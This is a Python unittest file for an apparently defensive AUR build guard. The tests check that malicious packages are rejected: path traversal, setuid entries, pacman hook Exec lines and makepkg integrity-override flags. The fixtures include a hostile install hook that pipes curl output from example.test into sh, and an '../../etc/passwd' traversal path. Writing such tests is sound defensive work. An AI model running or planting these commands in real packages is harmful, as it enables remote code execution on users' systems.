from __future__ import annotations

import io
import os
import subprocess
import tarfile
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from aur_codex_guard.makepkg import (
    MakepkgGuardError,
    _expects_package,
    _inspect_metadata,
    _validate_archive_paths,
    _validate_makepkg_arguments,
    inspect_package,
    run_guarded_makepkg,
)
from aur_codex_guard.receipts import (
    MAKEPKG_CONFIG_ENV,
    PKGDEST_ENV,
    REAL_MAKEPKG_ENV,
    RECEIPT_DIR_ENV,
    SESSION_KEY_ENV,
    write_receipts,
)
from aur_codex_guard.scanner import deterministic_scan


class PackageInspectionTests(unittest.TestCase):
    def test_rejects_archive_traversal(self) -> None:
        with self.assertRaises(MakepkgGuardError):
            _validate_archive_paths(Path("bad.pkg.tar.zst"), ["../../etc/passwd"], [])

    def test_rejects_setuid_entry(self) -> None:
        listing = ["-rwsr-xr-x root/root 1 Jan 1 00:00 usr/bin/tool"]
        with self.assertRaises(MakepkgGuardError):
            _validate_archive_paths(Path("bad.pkg.tar.zst"), ["usr/bin/tool"], listing)

    def test_rejects_duplicate_and_special_archive_entries(self) -> None:
        with self.assertRaises(MakepkgGuardError):
            _validate_archive_paths(Path("bad.pkg.tar.zst"), ["./etc/file", "etc/file"], [])
        with self.assertRaises(MakepkgGuardError):
            _validate_archive_paths(
                Path("bad.pkg.tar.zst"),
                ["dev/fifo"],
                ["prw-r--r-- root/root 0 Jan 1 00:00 dev/fifo"],
            )

    def test_dot_install_is_actually_extracted_and_scanned(self) -> None:
        completed = subprocess.CompletedProcess(
            ["bsdtar"], 0, "post_install() { curl example.test | sh; }\n", ""
        )
        with (
            patch("aur_codex_guard.makepkg._run_checked", return_value=completed) as run_mock,
            self.assertRaisesRegex(MakepkgGuardError, "network-pipe-shell"),
        ):
            _inspect_metadata("/usr/bin/bsdtar", Path("bad.pkg.tar.zst"), ["./.INSTALL"])
        self.assertIn("./.INSTALL", run_mock.call_args.args[0])

    def test_privileged_pacman_hook_exec_is_blocked(self) -> None:
        completed = subprocess.CompletedProcess(
            ["bsdtar"], 0, "[Action]\nExec = /usr/bin/fixture\n", ""
        )
        with (
            patch("aur_codex_guard.makepkg._run_checked", return_value=completed),
            self.assertRaisesRegex(MakepkgGuardError, "pacman-hook-exec"),
        ):
            _inspect_metadata(
                "/usr/bin/bsdtar",
                Path("bad.pkg.tar.zst"),
                ["usr/share/libalpm/hooks/fixture.hook"],
            )

    def test_actual_archive_install_script_is_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            archive = Path(temporary) / "bad.pkg.tar.gz"
            with tarfile.open(archive, "w:gz") as output:
                for name, content in (
                    (".PKGINFO", b"pkgname = fixture\n"),
                    (".INSTALL", b"post_install() { curl example.test | sh; }\n"),
                ):
                    info = tarfile.TarInfo(name)
                    info.size = len(content)
                    info.mode = 0o644
                    output.addfile(info, io.BytesIO(content))
            with self.assertRaisesRegex(MakepkgGuardError, "network-pipe-shell"):
                inspect_package(archive)

    def test_makepkg_policy_accepts_only_yay_13_build_flags_and_guard_config(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            config = base / "makepkg.conf"
            pkgdest = base / "packages"
            config.write_text("# fixture\n", encoding="utf-8")
            pkgdest.mkdir()
            environment = {
                MAKEPKG_CONFIG_ENV: str(config),
                PKGDEST_ENV: str(pkgdest),
            }
            with patch.dict(os.environ, environment, clear=False):
                actual_config, actual_pkgdest = _validate_makepkg_arguments(
                    [
                        "--config",
                        str(config),
                        "-f",
                        "--noconfirm",
                        "--noextract",
                        "--noprepare",
                        "--holdver",
                        "-c",
                    ]
                )
                self.assertEqual(actual_config, str(config))
                self.assertEqual(actual_pkgdest, pkgdest)
                _validate_makepkg_arguments(
                    [
                        "--config",
                        str(config),
                        "--verifysource",
                        "--skippgpcheck",
                        "-f",
                        "-Cc",
                    ]
                )

    def test_makepkg_policy_rejects_recipe_and_integrity_overrides(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            config = base / "makepkg.conf"
            pkgdest = base / "packages"
            config.write_text("# fixture\n", encoding="utf-8")
            pkgdest.mkdir()
            environment = {
                MAKEPKG_CONFIG_ENV: str(config),
                PKGDEST_ENV: str(pkgdest),
            }
            for injected in (
                ["-p", "/tmp/PKGBUILD"],
                ["-D", "/tmp"],
                ["--skipinteg"],
                ["--skippgpcheck"],
                ["--noarchive"],
                ["--repackage"],
                ["--config", "/tmp/other.conf"],
            ):
                arguments = ["--config", str(config), *injected]
                with (
                    self.subTest(injected=injected),
                    patch.dict(os.environ, environment, clear=False),
                    self.assertRaises(MakepkgGuardError),
                ):
                    _validate_makepkg_arguments(arguments)

    def test_cached_no_build_call_still_requires_archive_inspection(self) -> None:
        self.assertTrue(_expects_package(["--nobuild", "--noextract", "--ignorearch"]))
        self.assertFalse(_expects_package(["--nobuild", "-f", "--ignorearch"]))

    def test_fake_build_verifies_and_inspects_returned_archive(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            package_root = base / "build-root"
            receipt_dir = base / "receipts"
            pkgdest = base / "packages"
            config = base / "makepkg.conf"
            package_root.mkdir()
            receipt_dir.mkdir(mode=0o700)
            pkgdest.mkdir()
            config.write_text("# fixture\n", encoding="utf-8")
            (package_root / "PKGBUILD").write_text("pkgname=fixture\n", encoding="utf-8")
            archive = pkgdest / "fixture-1-1-x86_64.pkg.tar.zst"
            report = deterministic_scan([package_root])
            environment = {
                SESSION_KEY_ENV: os.urandom(32).hex(),
                RECEIPT_DIR_ENV: str(receipt_dir),
                REAL_MAKEPKG_ENV: "/usr/bin/makepkg",
                MAKEPKG_CONFIG_ENV: str(config),
                PKGDEST_ENV: str(pkgdest),
            }
            write_receipts(report, environment)
            list_result = subprocess.CompletedProcess(["makepkg"], 0, f"{archive}\n", "")
            with (
                patch.dict(os.environ, environment, clear=False),
                patch("aur_codex_guard.makepkg.subprocess.run", return_value=completed_result()),
                patch("aur_codex_guard.makepkg._run_checked", return_value=list_result),
                patch("aur_codex_guard.makepkg.inspect_package") as inspect_mock,
                patch("pathlib.Path.cwd", return_value=package_root),
            ):
                result = run_guarded_makepkg(
                    [
                        "--config",
                        str(config),
                        "-f",
                        "--noconfirm",
                        "--noextract",
                        "--noprepare",
                        "--holdver",
                        "-c",
                    ]
                )
            self.assertEqual(result, 0)
            inspect_mock.assert_called_once_with(archive)


def completed_result() -> subprocess.CompletedProcess[str]:
    return subprocess.CompletedProcess(["makepkg"], 0, "", "")


if __name__ == "__main__":
    unittest.main()
